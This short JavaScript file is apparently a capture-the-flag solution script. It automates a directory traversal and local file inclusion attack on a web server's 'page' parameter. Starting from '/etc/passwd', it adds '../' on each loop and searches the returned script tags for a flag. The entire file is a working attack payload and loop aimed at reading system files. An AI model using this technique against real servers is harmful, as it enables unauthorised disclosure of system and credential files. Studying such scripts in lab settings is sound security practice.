async function getPage(url) {
    const response = await fetch(url);
    return await response.text();

}

async function main()
{
    const baseUrl = "http://10.43.200.94/?page=/";

    let pageVar = "etc/passwd";

    while (true) {
        const url = baseUrl + pageVar;
        const response = await getPage(url);
        const scriptTags = response.match(/<script\b[^>]*>[\s\S]*?<\/script>/gi);
        for (let i = 0; i < scriptTags.length; i++) {
            if (scriptTags[i].includes("flag")) {
                console.log(scriptTags[i]);
                return scriptTags[i];
            }
        }
        pageVar = "../" + pageVar;
    }
}

main().catch((err) => console.error(err));
